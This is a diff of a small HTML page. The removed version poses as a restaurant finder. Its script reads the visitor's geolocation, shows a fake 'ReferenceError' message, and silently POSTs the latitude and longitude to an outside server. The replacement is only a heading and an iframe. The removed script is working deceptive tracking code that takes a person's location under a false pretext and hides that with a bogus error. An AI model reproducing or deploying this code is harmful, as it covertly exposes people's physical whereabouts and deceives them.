@@ -1,31 +1,3 @@
-<!DOCTYPE html>
-<html>
-<body>
+<h1>Really cool website</h1>
 
-<p>Click the button to find restaurants near you!</p>
-
-<button onclick="getLocation()">Try It</button>
-
-<p id="demo"></p>
-
-<script>
-var x = document.getElementById("demo");
-
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
-
-function showPosition(position) {
-  x.innerHTML = "Uncaught ReferenceError: restaurant is not defined at showRestaurant:1:1"; //Error got funky
-  let xhttp = new XMLHttpRequest();
-  xhttp.open("POST", "https://kronifer.pythonanywhere.com/data", true);
-  xhttp.send(JSON.stringify({"lat": position.coords.latitude.toString(), "long": position.coords.longitude.toString()}));
-}
-</script>
-
-</body>
-</html>
+<iframe src="https://kronifer.github.io" width="600" height="300"></iframe>
